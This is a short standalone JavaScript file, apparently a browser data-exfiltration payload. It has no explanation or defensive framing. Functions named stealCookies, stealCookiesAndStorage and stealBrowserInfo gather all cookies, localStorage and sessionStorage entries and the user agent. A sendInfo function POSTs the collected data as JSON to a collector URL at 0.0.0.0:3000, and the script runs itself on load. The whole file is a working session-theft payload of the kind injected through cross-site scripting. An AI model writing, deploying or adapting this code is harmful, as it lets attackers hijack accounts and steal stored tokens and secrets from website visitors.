function stealCookies() {
  const cookies = document.cookie.split(';');
  const cookieData = {};

  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    const [name, value] = cookie.split('=');
    cookieData[name] = value;
  }

  return cookieData;
}

function stealCookiesAndStorage() {
  const cookies = stealCookies();
  const localStorageData = {};
  const sessionStorageData = {};

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionStorageData[key] = sessionStorage.getItem(key);
  }

  return {
    cookies: cookies,
    localStorage: localStorageData,
    sessionStorage: sessionStorageData
  };
}

function stealBrowserInfo() {
  return {
    cookies: document.cookie,
    userAgent: navigator.userAgent,
  };
}

function sendInfo(infoData) {
  const serverUrl = 'http://0.0.0.0:3000/server';

  const xhr = new XMLHttpRequest();
  xhr.open('POST', serverUrl);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onload = function() {
    console.log('Information sent successfully');
  };
  xhr.onerror = function() {
    console.error('Failed to send information');
  };
  xhr.send(JSON.stringify(infoData));
}

function stealAndSendInfo() {
  const infoData = {
    ...stealCookiesAndStorage(),
    ...stealBrowserInfo()
  };
  sendInfo(infoData);
}

stealAndSendInfo();
